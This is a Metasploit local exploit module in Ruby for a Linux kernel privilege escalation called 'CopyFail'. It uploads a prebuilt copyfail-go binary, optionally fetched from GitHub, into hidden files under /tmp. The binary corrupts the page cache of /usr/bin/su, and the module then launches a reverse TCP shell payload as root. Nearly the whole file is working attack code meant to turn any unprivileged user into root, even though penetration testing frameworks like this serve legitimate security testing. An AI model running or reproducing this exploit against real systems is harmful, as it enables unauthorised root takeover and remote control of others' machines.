##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'digest'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE

  # ── copyfail-go release metadata ─────────────────────────────────────────
  COPYFAIL_RELEASE_BASE = 'https://github.com/badsectorlabs/copyfail-go/releases/latest/download'
  COPYFAIL_BINARIES = {
    'x86_64'  => { file: 'copyfail-go_Linux_x86_64',  sha256: '63d14926fd77a3c44626728d60d1679d7f9f92f680c88f86ccc0e13870195210' },
    'i386'    => { file: 'copyfail-go_Linux_i386',    sha256: 'cd4a9ec6fdbff9eef1dabd73c73e39cfc29f98e003c55310dc1f4c87522f2c20' },
    'i686'    => { file: 'copyfail-go_Linux_i386',    sha256: 'cd4a9ec6fdbff9eef1dabd73c73e39cfc29f98e003c55310dc1f4c87522f2c20' },
    'aarch64' => { file: 'copyfail-go_Linux_arm64',   sha256: '912714027c9ea12b8aac55d71ccfa4a0592e058a4d07cf578e67f4bfdab63c4a' },
    'arm64'   => { file: 'copyfail-go_Linux_arm64',   sha256: '912714027c9ea12b8aac55d71ccfa4a0592e058a4d07cf578e67f4bfdab63c4a' },
    'armv7l'  => { file: 'copyfail-go_Linux_armv7',   sha256: '4c032361d392e53b0b5ca683a45f7ec32f1339eb69b042130bb5367e1610c770' },
    'armhf'   => { file: 'copyfail-go_Linux_armv7',   sha256: '4c032361d392e53b0b5ca683a45f7ec32f1339eb69b042130bb5367e1610c770' },
  }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Linux CopyFail-Go Local Privilege Escalation',
        'Description'    => %q{
          This module exploits the "CopyFail" Linux kernel page-cache write primitive
          (algif_aead splice vulnerability) to escalate from any unprivileged user to root.

          It uses the badsectorlabs/copyfail-go precompiled binaries. The exploit corrupts 
          the /usr/bin/su page-cache so that executing it runs a payload as root.

          This module does not require `gcc` on the target. It supports x86_64, i386, 
          arm64, and armv7. It reads the precompiled binary from the `data/` directory, 
          verifies its SHA256 hash, and uploads it to the target for execution.

          IMPORTANT: After exploitation the page cache is contaminated. The module
          automatically issues `echo 3 > /proc/sys/vm/drop_caches` on success.
        },
        'License'        => MSF_LICENSE,
        'Author'         => [
          'badsectorlabs',                     # copyfail-go implementation
          'msf module author',                 # Metasploit module
        ],
        'References'     => [
          ['URL', 'https://github.com/badsectorlabs/copyfail-go'],
          ['URL', 'https://copy.fail/'],
        ],
        'Platform'       => ['linux'],
        'Arch'           => [ARCH_X64, ARCH_X86, ARCH_AARCH64, ARCH_ARMLE],
        'SessionTypes'   => ['shell', 'meterpreter'],
        'Targets'        => [
          ['Auto (CopyFail-Go)', {}],
        ],
        'DefaultTarget'  => 0,
        'DisclosureDate' => '2026-05-01', # Approx CopyFail disclosure date
        'DefaultOptions' => {
          'WfsDelay' => 60,
          'PAYLOAD'  => 'linux/x64/shell/reverse_tcp',
        },
        'Notes'          => {
          'Stability'    => [CRASH_SAFE],
          'Reliability'  => [REPEATABLE_SESSION],
          'SideEffects'  => [
            ARTIFACTS_ON_DISK,
            CONFIG_CHANGES,
          ],
        }
      )
    )

    register_options([
      OptString.new('WritableDir',      [true,  'Writable directory on target for staging', '/tmp']),
      OptBool.new('Cleanup',            [true,  'Drop page cache and remove staged files after exploit', true]),
      OptBool.new('CopyfailDownload',   [false, 'Fallback: download copyfail-go from GitHub Releases if not found locally', false]),
      OptString.new('CopyfailLocalBin', [false, 'Path to a specific copyfail-go binary (overrides auto-detection in data/ dir)', '']),
    ])
  end

  def check
    return CheckCode::Safe("Already running as root") if is_root?

    kernel = (get_sysinfo['kernel'] rescue nil) || cmd_exec('uname -r').strip
    vprint_status("Target kernel: #{kernel}")

    arch = detect_target_arch
    vprint_status("Target arch: #{arch}")

    if COPYFAIL_BINARIES[arch].nil?
      return CheckCode::Unknown("Architecture '#{arch}' is not supported by copyfail-go")
    end

    CheckCode::Appears("Kernel #{kernel} / arch #{arch} — appears vulnerable")
  end

  def exploit
    fail_with(Failure::None, "Already running as root") if is_root?

    writable_dir = datastore['WritableDir'].chomp('/')
    staged_files = []

    print_status("Attempting CopyFail-Go attack path...")

    cf_bin_data, cf_arch = fetch_copyfail_binary
    unless cf_bin_data
      fail_with(Failure::NotFound, "CopyFail-Go binary unavailable.")
    end

    cf_remote = "#{writable_dir}/.cf_#{Rex::Text.rand_text_alphanumeric(6)}"
    staged_files << cf_remote
    print_status("Uploading copyfail-go (#{cf_bin_data.length} bytes, arch=#{cf_arch}) → #{cf_remote}")
    write_file(cf_remote, cf_bin_data)
    cmd_exec("chmod +x '#{cf_remote}'")

    cf_output = cmd_exec("DIRTYFRAG_CORRUPT_ONLY=1 '#{cf_remote}' 2>&1", nil, 60)
    vprint_status("copyfail-go output:\n#{cf_output}")

    if su_patched?
      print_good("CopyFail-Go succeeded — /usr/bin/su page-cache corrupted")
      drop_payload_shell(writable_dir, staged_files)
    else
      fail_with(Failure::NoAccess, "CopyFail-Go did not corrupt the target. algif_aead may be blocked or target is patched.")
    end

  ensure
    if datastore['Cleanup']
      print_status("Cleanup: flushing page cache and removing staged files")
      cmd_exec('echo 3 > /proc/sys/vm/drop_caches 2>/dev/null; true')
      staged_files.each { |f| cmd_exec("rm -f '#{f}' 2>/dev/null; true") } if staged_files
    end
  end

  private

  def detect_target_arch
    arch = cmd_exec('uname -m 2>/dev/null').strip
    arch.empty? ? 'unknown' : arch
  end

  def fetch_copyfail_binary
    arch = detect_target_arch
    meta = COPYFAIL_BINARIES[arch]

    explicit = datastore['CopyfailLocalBin'].to_s.strip
    unless explicit.empty?
      unless ::File.exist?(explicit)
        print_warning("CopyfailLocalBin '#{explicit}' not found on attacker machine")
        return [nil, nil]
      end
      return load_and_verify(explicit, meta, arch)
    end

    unless meta
      print_warning("No copyfail-go binary configured for arch '#{arch}'")
      return [nil, nil]
    end

    data_dir  = ::File.join(::File.dirname(__FILE__), 'data')
    local_bin = ::File.join(data_dir, meta[:file])

    if ::File.exist?(local_bin)
      print_status("Loading bundled copyfail-go: #{local_bin}")
      return load_and_verify(local_bin, meta, arch)
    end

    unless datastore['CopyfailDownload']
      print_warning("Bundled binary not found at #{local_bin} and CopyfailDownload=false")
      return [nil, nil]
    end

    url = "#{COPYFAIL_RELEASE_BASE}/#{meta[:file]}"
    print_status("Bundled binary not found — downloading #{meta[:file]} from GitHub Releases...")
    require 'open-uri'
    begin
      data = URI.open(url, 'rb', read_timeout: 60) { |f| f.read } # rubocop:disable Security/Open
    rescue => e
      print_warning("Download failed: #{e.message}")
      return [nil, nil]
    end

    verify_sha256!(data, meta[:sha256], meta[:file]) ? [data, arch] : [nil, nil]
  end

  def load_and_verify(path, meta, arch)
    data = ::File.binread(path)
    print_status("Loaded #{::File.basename(path)} (#{data.length} bytes)")
    return [nil, nil] unless meta.nil? || verify_sha256!(data, meta[:sha256], ::File.basename(path))
    [data, arch]
  end

  def verify_sha256!(data, expected, label)
    actual = Digest::SHA256.hexdigest(data)
    if actual == expected
      print_good("SHA256 OK [#{label}]: #{actual[0..15]}...")
      true
    else
      print_error("SHA256 MISMATCH for #{label}!")
      false
    end
  end

  def su_patched?
    cmd_exec("dd if=/usr/bin/su bs=1 skip=120 count=2 2>/dev/null | od -An -tx1").include?('31 ff')
  end

  def drop_payload_shell(writable_dir, staged_files)
    payload_path = "#{writable_dir}/.#{Rex::Text.rand_text_alphanumeric(8)}"
    staged_files << payload_path
    print_status("Writing payload ELF to #{payload_path}")

    write_file(payload_path, generate_payload_exe)
    cmd_exec("chmod +x '#{payload_path}'")

    print_status("Launching payload via su (expecting root callback)...")
    cmd_exec("echo '' | su -c '#{payload_path}' root 2>/dev/null &")
    print_good("Payload launched — awaiting session callback")
  end
end
